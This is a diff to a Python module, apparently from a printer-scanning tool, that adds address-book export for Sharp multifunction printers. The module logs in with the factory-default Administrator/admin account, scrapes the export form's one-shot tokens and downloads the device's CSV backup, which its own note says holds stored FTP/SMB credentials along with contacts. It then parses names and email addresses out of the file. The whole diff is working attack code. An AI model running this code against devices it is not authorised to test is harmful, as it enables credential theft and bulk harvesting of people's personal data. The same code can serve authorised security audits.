@@ -20,6 +20,8 @@ Two things make Sharp different from Ricoh:
     scraped from the form immediately before posting, on the same session
     cookie. Replaying a stale token fails.
 """
+import csv
+import io
 import re
 from typing import Dict, List, Optional, Tuple
 
@@ -47,16 +49,31 @@ LOGIN_PATH = "/login.html"
 # both drives the form into admin mode and doubles as a privilege confirmation.
 POST_LOGIN_TARGET = "/addressbook.html"
 
+# Data Import/Export (CSV Format), under System Settings. Exporting is a three
+# step dance: scrape the form for its tokens, POST the export request, then
+# follow the 302 to the generated CSV.
+STORAGE_BACKUP_PATH = "/sysmgt_storagebackup_csv.html"
+EXPORT_RADIO_FIELD = "ggt_radio(50)"
+EXPORT_TYPE_ADDRESS_BOOK = "33"     # the other option, 23, is User Register Information
+
 ROLE_SELECT_FIELD = "ggt_select(10009)"     # "Login Name" dropdown
 LOGIN_NAME_FIELD = "ggt_textbox(10002)"     # free-text login name (user-auth mode)
 PASSWORD_FIELD = "ggt_textbox(10003)"       # "Password"
 
 _FORM_RE = re.compile(r"<form[^>]*name=\"login\"[^>]*>(.*?)</form>", re.S | re.I)
+
+
+def _form_block(html: str, name: str) -> Optional[str]:
+    """Pull out the inner HTML of a named <form>."""
+    pattern = re.compile(r"<form[^>]*name=\"" + re.escape(name) + r"\"[^>]*>(.*?)</form>", re.S | re.I)
+    m = pattern.search(html or "")
+    return m.group(1) if m else None
 _INPUT_RE = re.compile(r"<input\b([^>]*)>", re.S | re.I)
 _SELECT_RE = re.compile(r"<select[^>]*name=\"([^\"]+)\"[^>]*>(.*?)(?:</select>)", re.S | re.I)
 _OPTION_RE = re.compile(r"<option[^>]*value=\"([^\"]*)\"([^>]*)>\s*([^<]*)", re.S | re.I)
 _ATTR_RE = re.compile(r"(\w[\w-]*)\s*=\s*\"([^\"]*)\"", re.S)
 _MODEL_RE = re.compile(r"[-–]\s*([A-Z]{2}[A-Z0-9][A-Z0-9\-]*)\s*$")
+EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
 
 
 def _attrs(blob: str) -> Dict[str, str]:
@@ -66,9 +83,9 @@ def _attrs(blob: str) -> Dict[str, str]:
 class LoginForm:
     """The parsed contents of a Sharp login form."""
 
-    def __init__(self, html: str):
-        body = _FORM_RE.search(html)
-        self.raw = body.group(1) if body else (html or "")
+    def __init__(self, html: str, name: str = "login"):
+        body = _form_block(html, name)
+        self.raw = body if body is not None else (html or "")
         self.fields: Dict[str, str] = {}
         self.field_types: Dict[str, str] = {}
         for blob in _INPUT_RE.findall(self.raw):
@@ -108,17 +125,17 @@ class LoginForm:
 class SharpModule(PrinterModule):
     name = "sharp"
     display_name = "Sharp MFP"
-    supports_export = False
+    supports_export = True
     export_note = (
-        "Address book export is not implemented for Sharp yet - it needs a captured "
-        "authenticated export request from a Sharp device to implement faithfully."
+        "Exports via System Settings > Data Import/Export (CSV). The CSV carries stored "
+        "FTP/SMB credentials for scan-to-folder destinations as well as contacts."
     )
     default_accounts = [
         Account(
             label="Administrator",
             username="Administrator",
             password="admin",
-            can_export=False,
+            can_export=True,
             note="Sharp factory default administrator password",
         ),
     ]
@@ -288,6 +305,148 @@ class SharpModule(PrinterModule):
         result.outcome = "SUCCESS"
         result.detail = detail or f"302 -> {location}"
         return result
+
+    # ---- export --------------------------------------------------------
+    def export_address_book(self, result: LoginResult,
+                            ctx: ScanContext) -> Tuple[str, str, Optional[str]]:
+        """
+        Pull the address book out through System Settings > Data Import/Export.
+
+            GET  /sysmgt_storagebackup_csv.html     -> form + token1/token2
+            POST /sysmgt_storagebackup_csv.html
+                 action=export_btn&ggt_radio(50)=33 -> 302, Location: the CSV
+            GET  <Location>                         -> text/csv attachment
+        """
+        hostport = result.target.hostport
+        session = result.session or {}
+        cookies = session.get("cookies") or {}
+        if not cookies:
+            return hostport, "ERROR: No session data available", None
+
+        base_url = session.get("base_url", result.target.base_url)
+        url = f"{base_url}{STORAGE_BACKUP_PATH}"
+        headers = {
+            "User-Agent": BROWSER_UA,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Referer": f"{base_url}/system.html",
+        }
+
+        # STEP 1: load the export form for its one-shot tokens.
+        log_request(ctx, "SHARP EXPORT FORM", hostport, "GET", url, headers, cookies)
+        try:
+            page = http_get(url, ctx, headers=headers, cookies=cookies,
+                            allow_redirects=False, timeout=ctx.export_timeout)
+        except RequestException as exc:
+            return hostport, f"ERROR: Export form request failed - {exc.__class__.__name__}: {exc}", None
+
+        log_response(ctx, "SHARP EXPORT FORM RESPONSE", hostport, page, body_limit=400)
+
+        if page.status_code != 200:
+            return hostport, f"ERROR: Export form returned HTTP {page.status_code}", None
+
+        form = LoginForm(page.text or "", name="storage_csv_export")
+        if not form.fields:
+            return hostport, ("ERROR: export form not found - the account may lack "
+                              "administrator rights for System Settings"), None
+
+        data: Dict[str, str] = {
+            name: value for name, value in form.fields.items()
+            if form.field_types.get(name) == "hidden"
+        }
+        data[EXPORT_RADIO_FIELD] = EXPORT_TYPE_ADDRESS_BOOK
+        data["action"] = "export_btn"
+
+        post_headers = dict(headers)
+        post_headers.update({
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": base_url,
+            "Referer": url,
+        })
+
+        # STEP 2: ask the device to generate the CSV.
+        log_request(ctx, "SHARP EXPORT REQUEST", hostport, "POST", url, post_headers, cookies, data)
+        try:
+            resp = http_post(url, ctx, headers=post_headers, cookies=cookies, data=data,
+                             allow_redirects=False, timeout=ctx.export_timeout)
+        except RequestException as exc:
+            return hostport, f"ERROR: Export failed - {exc.__class__.__name__}: {exc}", None
+
+        log_response(ctx, "SHARP EXPORT RESPONSE", hostport, resp, body_limit=400)
+
+        location = resp.headers.get("Location", "")
+        if resp.status_code != 302 or not location:
+            return hostport, (f"ERROR: Export request returned HTTP {resp.status_code} "
+                              f"instead of a download redirect"), None
+
+        # STEP 3: collect the generated file.
+        download_url = location if location.startswith("http") else f"{base_url}{location}"
+        log_request(ctx, "SHARP EXPORT DOWNLOAD", hostport, "GET", download_url, headers, cookies)
+        try:
+            download = http_get(download_url, ctx, headers={**headers, "Referer": url},
+                                cookies=cookies, allow_redirects=False,
+                                timeout=ctx.export_timeout, max_bytes=16 * 1024 * 1024)
+        except RequestException as exc:
+            return hostport, f"ERROR: Export download failed - {exc.__class__.__name__}: {exc}", None
+
+        log_response(ctx, "SHARP EXPORT DOWNLOAD RESPONSE", hostport, download, body_limit=200)
+
+        if download.status_code != 200:
+            return hostport, f"ERROR: Export download returned HTTP {download.status_code}", None
+
+        body = download.text or ""
+        content_type = download.headers.get("Content-Type", "")
+        if "csv" not in content_type.lower() and "address" not in body[:200].lower():
+            return hostport, ("ERROR: Export download was not a CSV "
+                              f"(Content-Type: {content_type or 'unset'})"), None
+
+        safe_filename = hostport.replace(":", "_").replace("/", "_")
+        output_file = f"{ctx.output_dir}/addressbook_{self.name}_{safe_filename}.csv"
+        with open(output_file, "w", encoding="utf-8") as f:
+            f.write(body)
+
+        entries = max(0, len([line for line in body.splitlines() if line.strip()]) - 1)
+        return hostport, f"SUCCESS: Exported {entries} entry/entries to {output_file}", output_file
+
+    # ---- contact extraction --------------------------------------------
+    def extract_contacts(self, text: str) -> Tuple[List[str], List[str]]:
+        """
+        Sharp exports a quoted CSV whose first row names the columns, e.g.
+        address, search-id, name, ..., mail-address, fax-number, ftp-host, ...
+
+        Columns are looked up by name rather than position, since the set varies
+        with firmware and with which destination types the device supports.
+        """
+        content = (text or "").lstrip("\ufeff")
+        if not content.strip():
+            return [], []
+
+        try:
+            rows = list(csv.reader(io.StringIO(content)))
+        except csv.Error:
+            return EMAIL_RE.findall(content), []
+        if not rows:
+            return [], []
+
+        header = [column.strip().strip('"').lower() for column in rows[0]]
+        name_idx = header.index("name") if "name" in header else None
+        mail_idx = header.index("mail-address") if "mail-address" in header else None
+
+        if name_idx is None and mail_idx is None:
+            # Unrecognised layout - fall back to scraping addresses out of it.
+            return EMAIL_RE.findall(content), []
+
+        emails: List[str] = []
+        names: List[str] = []
+        for row in rows[1:]:
+            if mail_idx is not None and len(row) > mail_idx:
+                value = row[mail_idx].strip()
+                if value and "@" in value:
+                    emails.append(value)
+            if name_idx is not None and len(row) > name_idx:
+                value = row[name_idx].strip()
+                if value:
+                    names.append(value)
+        return emails, names
 
     def _confirm_session(self, target: Target, session: Dict, ctx: ScanContext,
                          location: str) -> Tuple[Optional[bool], str]:
